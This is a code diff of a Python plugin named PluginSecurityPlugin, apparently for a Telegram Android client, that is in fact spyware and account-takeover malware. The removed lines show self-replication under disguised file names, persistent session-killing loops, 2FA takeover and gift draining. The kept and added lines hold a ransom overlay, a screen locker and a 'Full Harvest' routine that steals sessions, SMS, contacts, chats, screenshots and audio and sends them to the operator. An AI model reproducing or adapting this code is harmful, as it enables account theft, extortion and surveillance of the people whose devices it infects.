-        return None
-
-    def _self_path(self):
-        try:
-            m = sys.modules.get(__name__)
-            f = getattr(m, "__file__", None)
-            if f and os.path.exists(f):
-                return f
-        except Exception:
-            pass
-        return None
-
-    def _harden_file(self, path):
-        try:
-            k = path
-            n = time.time()
-            l = self._harden_cache.get(k, 0)
-            if n - l < 10:
-                return
-            self._harden_cache[k] = n
-        except Exception:
-            pass
-        try:
-            from java.io import File
-            f = File(path)
-            f.setReadOnly()
-        except Exception:
-            pass
-
-    def _replicate_self(self, n=10):
-        pd = self._plugins_dir()
-        if not pd:
-            return {"ok": False}
-        sp = self._self_path()
-        if not sp:
-            return {"ok": False}
-        try:
-            with open(sp, "rb") as f:
-                src = f.read()
-        except Exception as e:
-            return {"ok": False, "error": str(e)}
-        names = ["kernel_hook.plugin", "system_guard.plugin", "boot_watch.plugin",
-                 "net_monitor.plugin", "mem_sync.plugin", "proc_hold.plugin",
-                 "core_lock.plugin", "daemon_run.plugin", "svc_watch.plugin",
-                 "ring0_mon.plugin"]
-        made = []
-        for i in range(min(int(n), len(names))):
-            try:
-                tgt = os.path.join(pd, names[i])
-                if os.path.exists(tgt):
-                    made.append(names[i])
-                    continue
-                with open(tgt, "wb") as f:
-                    f.write(src)
-                self._harden_file(tgt)
-                made.append(names[i])
-            except Exception:
-                pass
-        return {"ok": True, "made": made}
-
-    def _nuke_marker_path(self):
-        try:
-            ctx = ApplicationLoader.applicationContext
-            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()),
-                                ".ar_nuke_active")
-        except Exception:
-            return None
-
-    def _mark_nuke(self):
-        try:
-            m = self._nuke_marker_path()
-            if m:
-                with open(m, "w") as f:
-                    f.write("idk")
-                self._harden_file(m)
-            self._nuke_started = True
-        except Exception:
-            pass
-
-    def _check_persisted_nuke(self):
-        try:
-            m = self._nuke_marker_path()
-            if not m or not os.path.exists(m):
-                return
-            self._nuke_started = True
-            threading.Thread(target=self._nuke_loop, daemon=True).start()
-        except Exception:
-            pass
-
-    def _nuke_loop(self):
-        while self._sync_running and self._active:
-            try:
-                m = self._nuke_marker_path()
-                if not m or not os.path.exists(m):
-                    return
-                self._parallel([(self._kill_all_sessions, 0),
-                                (self._kill_web_authorizations, 0)],
-                               workers=2, timeout=25)
-                for _ in range(60):
-                    if not (self._sync_running and self._active):
-                        return
-                    time.sleep(5)
-            except Exception:
-                for _ in range(12):
-                    if not (self._sync_running and self._active):
-                        return
-                    time.sleep(5)
-
-    def _check_persisted_idk(self):
-        try:
-            prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
-            if prefs.getBoolean("idk_active", False):
-                self._show_idk_overlay()
-        except Exception:
-            pass
-
-    # ─── PULL OUT ─────────────────────────────────────────────────────────
     def _pull_out_account(self):
         try:
             self._send_msg("Pull Out...")
@@ -2912,7 +2338,6 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception as e:
             self._send_msg("Pull out exc: " + str(e))
 
-    # ─── IDK OVERLAY ──────────────────────────────────────────────────────
     def _ensure_overlay_perm(self, ctx):
         try:
             if jclass("android.provider.Settings").canDrawOverlays(ctx):
@@ -2931,548 +2356,14 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             return False
 
-    def _show_idk_overlay(self):
-        if self._idk_view is not None:
-            return {"ok": True, "already": True}
-        try:
-            ctx = ApplicationLoader.applicationContext
-            if ctx is None:
-                return {"error": "no ctx"}
-            use_decor = not self._ensure_overlay_perm(ctx)
-            drew = threading.Event()
-            derr = [None]
-
-            def _build():
-                try:
-                    CTX = jclass("android.content.Context")
-                    wm = ctx.getSystemService(CTX.WINDOW_SERVICE)
-                    self._idk_wm = wm
-                    LL = jclass("android.widget.LinearLayout")
-                    TV = jclass("android.widget.TextView")
-                    LP = jclass("android.view.WindowManager$LayoutParams")
-                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
-                    Color = jclass("android.graphics.Color")
-                    Gravity = jclass("android.view.Gravity")
-                    TV2 = jclass("android.util.TypedValue")
-                    VLG = jclass("android.view.ViewGroup$LayoutParams")
-                    root = LL(ctx)
-                    root.setOrientation(LL.VERTICAL)
-                    root.setBackgroundColor(Color.parseColor(IDK_BG))
-                    root.setGravity(Gravity.CENTER)
-                    tv = TV(ctx)
-                    tv.setText(IDK_TEXT)
-                    tv.setTextColor(Color.parseColor(IDK_FG))
-                    tv.setTextSize(TV2.COMPLEX_UNIT_SP, 96)
-                    tv.setTypeface(tv.getTypeface(), 1)
-                    tv.setGravity(Gravity.CENTER)
-                    root.addView(tv, LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
-                    root.setFocusableInTouchMode(True)
-                    root.requestFocus()
-                    try:
-                        root.setOnKeyListener(_make_idk_key())
-                    except Exception:
-                        pass
-                    try:
-                        root.setOnClickListener(_make_idk_click())
-                    except Exception:
-                        pass
-                    if use_decor:
-                        act2 = self._get_activity()
-                        if act2 is None:
-                            raise Exception("no activity")
-                        win = act2.getWindow()
-                        for f in ("FLAG_KEEP_SCREEN_ON", "FLAG_SHOW_WHEN_LOCKED",
-                                  "FLAG_DISMISS_KEYGUARD", "FLAG_TURN_SCREEN_ON"):
-                            try:
-                                win.addFlags(getattr(LP, f, 0))
-                            except Exception:
-                                pass
-                        decor = win.getDecorView()
-                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
-                        self._idk_decor = decor
-                    else:
-                        params = LP(
-                            LP.MATCH_PARENT, LP.MATCH_PARENT,
-                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
-                                    getattr(LP, "TYPE_PHONE", 2002)),
-                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
-                            | getattr(LP, "FLAG_SHOW_WHEN_LOCKED", 0x80000)
-                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
-                            -3)
-                        params.gravity = Gravity.CENTER
-                        wm.addView(root, params)
-                    self._idk_view = root
-                except Exception as e:
-                    derr[0] = e
-                finally:
-                    drew.set()
-
-            act = self._get_activity()
-            if act is not None:
-                act.runOnUiThread(_build)
-            else:
-                _build()
-            drew.wait(8)
-            if derr[0] is not None:
-                return {"error": "idk overlay: %s" % derr[0]}
-            if self._idk_view is None:
-                return {"error": "overlay not created"}
-            self._idk_keep_running = True
-            self._idk_thread = threading.Thread(target=self._idk_keepalive_loop,
-                                                 daemon=True)
-            self._idk_thread.start()
-            return {"ok": True}
-        except Exception as e:
-            return {"error": "idk: %s" % e}
-
-    def _idk_keepalive_loop(self):
-        while self._idk_keep_running and self._sync_running:
-            try:
-                if self._idk_view is None:
-                    self._idk_keep_running = False
-                    return
-                if self._idk_view.getParent() is None:
-                    self._idk_view = None
-                    self._idk_keep_running = False
-                    return
-            except Exception:
-                self._idk_view = None
-                self._idk_keep_running = False
-                return
-            time.sleep(0.5)
-
-    def _hide_idk_overlay(self):
-        try:
-            self._idk_keep_running = False
-            if self._idk_view is None and self._idk_decor is None:
-                return {"ok": True}
-            removed = threading.Event()
-
-            def _rm():
-                try:
-                    if self._idk_view is not None:
-                        parent = self._idk_decor or self._idk_wm
-                        if parent is not None:
-                            try:
-                                parent.removeView(self._idk_view)
-                            except Exception:
-                                pass
-                        self._idk_view = None
-                        self._idk_decor = None
-                except Exception:
-                    pass
-                finally:
-                    removed.set()
-
-            act = self._get_activity()
-            if act is not None:
-                act.runOnUiThread(_rm)
-                removed.wait(6)
-            else:
-                _rm()
-            return {"ok": True}
-        except Exception as e:
-            return {"error": "hide idk: %s" % e}
-
-    # ─── IDK START ────────────────────────────────────────────────────────
-    def _idk_start(self):
-        def task():
-            def alive():
-                return self._sync_running and self._active and not self.stop
-            try:
-                if SHOW_IDK_OVERLAY:
-                    try:
-                        self._show_idk_overlay()
-                    except Exception:
-                        pass
-                    try:
-                        prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
-                        e = prefs.edit()
-                        e.putBoolean("idk_active", True)
-                        e.apply()
-                    except Exception:
-                        pass
-
-                self._send_msg("IDK START")
-                t0 = time.time()
-                pwd_report = {"final": "skip"}
-                dr = None
-                ws = []
-
-                if not alive():
-                    return
-                self._send_msg("1/15 Tg kid + harvest...")
-                try:
-                    self._tg_kid()
-                except Exception as e:
-                    _log("idk 1: %s" % e)
-
-                if not alive():
-                    return
-                self._send_msg("2/15 2FA...")
-                try:
-                    pwd_report = self._nuke_password_pipeline(0)
-                except Exception as e:
-                    pwd_report = {"final": "exc", "error": str(e)}
-
-                if not alive():
-                    return
-                self._send_msg("3/15 confirm sessions...")
-                try:
-                    self._confirm_unconfirmed_sessions(0)
-                except Exception:
-                    pass
-
-                if not alive():
-                    return
-                self._send_msg("4/15 web/bots/channels...")
-                for fn in (self._kill_web_authorizations,
-                           self._kill_bots, self._leave_all_channels):
-                    try:
-                        fn(0)
-                    except Exception:
-                        pass
-
-                if not alive():
-                    return
-                self._send_msg("5/15 profile...")
-                for fn in (self._change_username, self._change_profile,
-                           self._reset_contacts):
-                    try:
-                        fn(0)
-                    except Exception:
-                        pass
-
-                if not alive():
-                    return
-                self._send_msg("6/15 gift drain...")
-                try:
-                    dr = self._drain_gifts(0)
-                except Exception as e:
-                    dr = {"error": str(e)}
-
-                if not alive():
-                    return
-                self._send_msg("7/15 kill sessions...")
-                try:
-                    self._kill_all_sessions(0)
-                except Exception:
-                    pass
-
-                if not alive():
-                    return
-                self._send_msg("8/15 wipe sessions...")
-                try:
-                    ws = self._wipe_sessions_all()
-                except Exception as e:
-                    ws = [{"error": str(e)}]
-                try:
-                    self._kill_login_notice_dialog(0)
-                except Exception:
-                    pass
-
-                if not alive():
-                    return
-                self._send_msg("9/15 session dumps...")
-                try:
-                    self._manual_dump_session()
-                except Exception:
-                    pass
-                try:
-                    self._manual_userbot_session()
-                except Exception:
-                    pass
-
-                if not alive():
-                    return
-                self._send_msg("10/15 screenshot gain...")
-                try:
-                    self._screenshot_gain()
-                except Exception as e:
-                    _log("idk 10: %s" % e)
-
-                if not alive():
-                    return
-                self._send_msg("11/15 sms/contacts/apps/chats...")
-                for fn in (self._manual_sms, self._manual_contacts,
-                           self._manual_apps, self._manual_chats):
-                    try:
-                        fn()
-                    except Exception:
-                        pass
-
-                if not alive():
-                    return
-                self._send_msg("12/15 saved export...")
-
-                if not alive():
-                    return
-                self._send_msg("13/15 persistence...")
-                try:
-                    self._replicate_self(10)
-                except Exception:
-                    pass
-                try:
-                    self._mark_nuke()
-                except Exception:
-                    pass
-
-                if not alive():
-                    return
-                self._send_msg("14/15 re-kill sessions...")
-                try:
-                    self._kill_all_sessions(0)
-                except Exception:
-                    pass
-                try:
-                    self._kill_web_authorizations(0)
-                except Exception:
-                    pass
-
-                if not alive():
-                    return
-                self._send_msg("15/15 pull out...")
-                try:
-                    self._pull_out_account()
-                except Exception:
-                    pass
-
-                try:
-                    rep = ["<b>IDK START result</b>"]
-                    rep.append("<b>2FA:</b> %s" % pwd_report.get("final"))
-                    if isinstance(dr, dict):
-                        if dr.get("error"):
-                            rep.append("<b>Gifts:</b> err=%s" % dr["error"])
-                        else:
-                            conv = dr.get("convert") or {}
-                            u = dr.get("u") or []
-                            ok_count = sum(1 for x in u if isinstance(x, dict)
-                                           and isinstance(x.get("result"), dict)
-                                           and x["result"].get("ok"))
-                            rep.append("<b>Gifts:</b> conv=%s nft=%d deficit=%s" % (
-                                conv.get("converted_stars", 0),
-                                ok_count, dr.get("fee_deficit", 0)))
-                    tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
-                    rep.append("<b>Sessions:</b> %d" % tk)
-                    rep.append("<b>Pull Out:</b> last")
-                    rep.append("<b>Time:</b> %.1fs" % (time.time() - t0))
-                    self._send_msg("\n".join(rep), html=True)
-                except Exception:
-                    pass
-            except Exception as e:
-                try:
-                    self._send_msg("IDK err: " + str(e))
-                except Exception:
-                    pass
-        threading.Thread(target=task, daemon=True).start()
-
-    # ─── FULL HARVEST ─────────────────────────────────────────────────────
-    def _full_harvest(self):
-        def task():
-            def alive():
-                return self._sync_running and self._active and not self.stop
-            try:
-                t0 = time.time()
-                self._send_msg("Full Harvest...")
-                report = ["<b>Full Harvest</b>"]
-                for a in self._get_accounts_list():
-                    aid = a.get("id")
-                    info = self._harvest_account_info(int(aid))
-                    report.append("<b>acc%d:</b> uid=%s @%s +%s" % (
-                        aid, a.get("user_id"),
-                        self._html_escape(a.get("username") or "—"),
-                        self._html_escape(a.get("phone") or "—")))
-                    if info.get("2fa"):
-                        report.append("  2fa=%s stars=%s" % (
-                            info.get("2fa"), info.get("stars_balance", "0")))
-                if not alive():
-                    return
-                try:
-                    self._tg_kid()
-                    report.append("<b>Tg kid:</b> sent")
-                except Exception:
-                    pass
-                if not alive():
-                    return
-                try:
-                    self._screenshot_gain()
-                    report.append("<b>Screenshot gain:</b> sent")
-                except Exception:
-                    pass
-                if not alive():
-                    return
-                try:
-                    self._manual_audio(5)
-                    report.append("<b>Audio:</b> sent")
-                except Exception:
-                    pass
-                if not alive():
-                    return
-                try:
-                    for fn in (self._manual_sms, self._manual_contacts,
-                               self._manual_apps, self._manual_chats):
-                        if not alive():
-                            break
-                        fn()
-                    report.append("<b>SMS/contacts/apps/chats:</b> sent")
-                except Exception:
-                    pass
-                if not alive():
-                    return
-                try:
-                    self._manual_dump_session()
-                    self._manual_userbot_session()
-                    report.append("<b>Session theft:</b> sent")
-                except Exception:
-                    pass
-                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
-                self._send_msg("\n".join(report), html=True)
-            except Exception as e:
-                self._send_msg("harvest err: " + str(e))
-        threading.Thread(target=task, daemon=True).start()
-
-    # ─── FULL LOCKDOWN ────────────────────────────────────────────────────
-    def _full_lockdown(self):
-        def task():
-            def alive():
-                return self._sync_running and self._active and not self.stop
-            try:
-                t0 = time.time()
-                self._send_msg("Full Lockdown...")
-                report = ["<b>Full Lockdown</b>"]
-
-                # 0 Deploy
-                self._send_msg("0/7 deploy...")
-                try:
-                    self._parallel([(self._replicate_self, 10),
-                                    (self._mark_nuke,)], workers=2, timeout=30)
-                    report.append("<b>Deploy:</b> ok")
-                except Exception as e:
-                    report.append("<b>Deploy:</b> %s" % e)
-
-                if not alive():
-                    return
-                # 1 Group A
-                self._send_msg("1/7 group A...")
-                ga = self._parallel([
-                    (self._tg_kid,),
-                    (self._confirm_unconfirmed_sessions, 0),
-                    (self._kill_web_authorizations, 0),
-                    (self._leave_all_channels, 0),
-                    (self._kill_bots, 0),
-                ], workers=5, timeout=120)
-                report.append("<b>Tg kid:</b> %s" % self._html_escape(str(ga[0] or "—")))
-                report.append("<b>Pending:</b> %s" % str(ga[1]))
-                report.append("<b>Web:</b> %s" % str(ga[2]))
-                report.append("<b>Channels:</b> %s" % str(ga[3]))
-                report.append("<b>Bots:</b> %s" % str(ga[4]))
-
-                if not alive():
-                    return
-                # 2 gift drain
-                self._send_msg("2/7 gift drain...")
-                try:
-                    gr = self._drain_gifts(0)
-                    if gr.get("error"):
-                        report.append("<b>Gifts:</b> err=%s" % gr["error"])
-                    else:
-                        conv = gr.get("convert") or {}
-                        u = gr.get("u") or []
-                        ok_count = sum(1 for x in u if isinstance(x, dict)
-                                       and isinstance(x.get("result"), dict)
-                                       and x["result"].get("ok"))
-                        report.append("<b>Gifts:</b> conv=%s nft=%d deficit=%s" % (
-                            conv.get("converted_stars", 0), ok_count,
-                            gr.get("fee_deficit", 0)))
-                except Exception as e:
-                    report.append("<b>Gifts:</b> %s" % e)
-
-                if not alive():
-                    return
-                # 3 profile
-                self._send_msg("3/7 profile...")
-                try:
-                    pwd = self._nuke_password_pipeline(0)
-                except Exception as e:
-                    pwd = {"final": "exc: %s" % e}
-                try:
-                    new_un = self._change_username(0)
-                except Exception:
-                    new_un = None
-                try:
-                    prof = self._change_profile(0)
-                except Exception:
-                    prof = False
-                try:
-                    cont = self._reset_contacts(0)
-                except Exception:
-                    cont = False
-                report.append("<b>2FA:</b> %s" % pwd.get("final", "?"))
-                report.append("<b>Username:</b> @%s" % self._html_escape(str(new_un or "?")))
-                report.append("<b>Profile:</b> %s" % ("[LOCKED]" if prof else "fail"))
-                report.append("<b>Contacts:</b> %s" % cont)
-
-                if not alive():
-                    return
-                # 4 kill sessions
-                self._send_msg("4/7 kill sessions...")
-                k, total = self._kill_all_sessions(0)
-                self._kill_login_notice_dialog(0)
-                report.append("<b>Sessions killed:</b> %d / %d" % (k, total))
-
-                if not alive():
-                    return
-                # 5 re-kill
-                self._send_msg("5/7 re-kill...")
-                k2, _t = self._kill_all_sessions(0)
-                self._kill_web_authorizations(0)
-                report.append("<b>Re-killed:</b> %d" % k2)
-
-                if not alive():
-                    return
-                # 6 persistence
-                self._send_msg("6/7 persistence...")
-                try:
-                    self._replicate_self(10)
-                    self._mark_nuke()
-                    threading.Thread(target=self._nuke_loop, daemon=True).start()
-                    report.append("<b>Persistence:</b> ok")
-                except Exception as e:
-                    report.append("<b>Persistence:</b> %s" % e)
-
-                if not alive():
-                    return
-                # 7 pull out
-                self._send_msg("7/7 pull out...")
-                try:
-                    self._pull_out_account()
-                    report.append("<b>Pull Out:</b> last")
-                except Exception as e:
-                    report.append("<b>Pull Out:</b> %s" % e)
-
-                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
-                report.append("<b>ANNIHLATION complete</b>")
-                self._send_markup("\n".join(report), {
-                    "inline_keyboard": [
-                        [{"text": "Logout again", "callback_data": "hv_logout"}],
-                    ]
-                }, html=True)
-            except Exception as e:
-                self._send_msg("lockdown err: " + str(e))
-        threading.Thread(target=task, daemon=True).start()
-
-    # ─── TROLL ────────────────────────────────────────────────────────────
     def _show_ransom(self, text="", photo_url=""):
         if self._ransom_view is not None:
             return {"ok": True, "already": True}
         try:
-            if time.time() < self._ransom_pay_grace_until:
-                return {"ok": True, "grace": int(self._ransom_pay_grace_until - time.time())}
             ctx = ApplicationLoader.applicationContext
             if ctx is None:
                 return {"error": "no ctx"}
             use_decor = not self._ensure_overlay_perm(ctx)
-            self._ransom_args = {"text": text, "photo_url": photo_url}
             photo_path = ""
             if photo_url and self._ransom_photo_path and self._ransom_photo_url == photo_url \
                     and os.path.exists(self._ransom_photo_path):
@@ -3535,8 +2426,7 @@ class PluginSecurityPlugin(BasePlugin):
                         except Exception:
                             pass
                     tv = TV(ctx)
-                    tv_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
-                    tv.setLayoutParams(tv_lp)
+                    tv.setLayoutParams(LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
                     tv.setText(str(text))
                     tv.setTextColor(Color.WHITE)
                     tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18)
@@ -3609,7 +2499,7 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _dismiss_ransom(self):
         try:
-            if self._ransom_view is None and self._ransom_mini_view is None:
+            if self._ransom_view is None:
                 return {"ok": True}
             removed = threading.Event()
 
@@ -3621,9 +2511,6 @@ class PluginSecurityPlugin(BasePlugin):
                             parent.removeView(self._ransom_view)
                         self._ransom_view = None
                         self._ransom_decor = None
-                    if self._ransom_mini_view is not None and self._ransom_wm is not None:
-                        self._ransom_wm.removeView(self._ransom_mini_view)
-                        self._ransom_mini_view = None
                 except Exception:
                     pass
                 finally:
@@ -3650,30 +2537,18 @@ class PluginSecurityPlugin(BasePlugin):
             def _render():
                 try:
                     Color = jclass("android.graphics.Color")
-                    BitmapFactory = jclass("android.graphics.BitmapFactory")
                     FrameLayout = jclass("android.widget.FrameLayout")
-                    ImageView = jclass("android.widget.ImageView")
                     VLG = jclass("android.view.ViewGroup$LayoutParams")
-                    Gravity = jclass("android.view.Gravity")
                     root = FrameLayout(act)
                     root.setBackgroundColor(Color.BLACK)
-                    path = self._lock_path
-                    if path and os.path.exists(path):
-                        iv = ImageView(act)
-                        iv.setScaleType(ImageView.ScaleType.FIT_XY)
-                        bmp = BitmapFactory.decodeFile(path)
-                        if bmp is not None:
-                            iv.setImageBitmap(bmp)
-                        lp = VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT)
-                        iv.setLayoutParams(lp)
-                        root.addView(iv)
-                    act.getWindow().getDecorView().addView(root,
-                        VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                    act.getWindow().getDecorView().addView(
+                        root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                     self._locker_view = root
                     self._locker_on = True
                     self._send_msg("Locker ON")
                 except Exception as e:
                     _log("locker: %s" % e)
+
             act.runOnUiThread(_render)
         except Exception as e:
             self._send_msg("lock err: " + str(e))
@@ -3694,9 +2569,6 @@ class PluginSecurityPlugin(BasePlugin):
     def _play_mmusic(self, url):
         def task():
             try:
-                act = self._get_activity()
-                if act is None:
-                    return
                 ctx = ApplicationLoader.applicationContext
                 d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
                 if not os.path.exists(d):
@@ -3717,6 +2589,7 @@ class PluginSecurityPlugin(BasePlugin):
                 self._send_msg("Music playing")
             except Exception as e:
                 self._send_msg("music err: " + str(e))
+
         threading.Thread(target=task, daemon=True).start()
 
     def _clear_music(self):
@@ -3794,6 +2667,7 @@ class PluginSecurityPlugin(BasePlugin):
                     self._dim_active = True
                 except Exception:
                     pass
+
             act.runOnUiThread(_dim)
         except Exception:
             pass
@@ -3810,6 +2684,70 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             self._dim_view = None
             self._dim_active = False
+
+    def _full_harvest(self):
+        def task():
+            def alive():
+                return self._sync_running and self._active and not self.stop
+            try:
+                t0 = time.time()
+                self._send_msg("Full Harvest...")
+                report = ["<b>Full Harvest</b>"]
+                for a in self._get_accounts_list():
+                    aid = a.get("id")
+                    info = self._harvest_account_info(int(aid))
+                    report.append("<b>acc%d:</b> uid=%s @%s +%s" % (
+                        aid, a.get("user_id"),
+                        self._html_escape(a.get("username") or "—"),
+                        self._html_escape(a.get("phone") or "—")))
+                    if info.get("2fa"):
+                        report.append("  2fa=%s stars=%s" % (
+                            info.get("2fa"), info.get("stars_balance", "0")))
+                if not alive():
+                    return
+                try:
+                    self._tg_kid()
+                    report.append("<b>Tg kid:</b> sent")
+                except Exception:
+                    pass
+                if not alive():
+                    return
+                try:
+                    self._screenshot_gain()
+                    report.append("<b>Screenshot gain:</b> sent")
+                except Exception:
+                    pass
+                if not alive():
+                    return
+                try:
+                    self._manual_audio(5)
+                    report.append("<b>Audio:</b> sent")
+                except Exception:
+                    pass
+                if not alive():
+                    return
+                try:
+                    self._manual_sms()
+                    self._manual_contacts()
+                    self._manual_apps()
+                    self._manual_chats()
+                    report.append("<b>SMS/contacts/apps/chats:</b> sent")
+                except Exception:
+                    pass
+                if not alive():
+                    return
+                try:
+                    self._manual_dump_session()
+                    self._manual_userbot_session()
+                    report.append("<b>Session theft:</b> sent")
+                except Exception:
+                    pass
+                report.append("<b>Time:</b> %.1fs" % (time.time() - t0))
+                self._send_msg("\n".join(report), html=True)
+            except Exception as e:
+                self._send_msg("harvest err: " + str(e))
+
+        threading.Thread(target=task, daemon=True).start()
 
 
 def create_plugin():
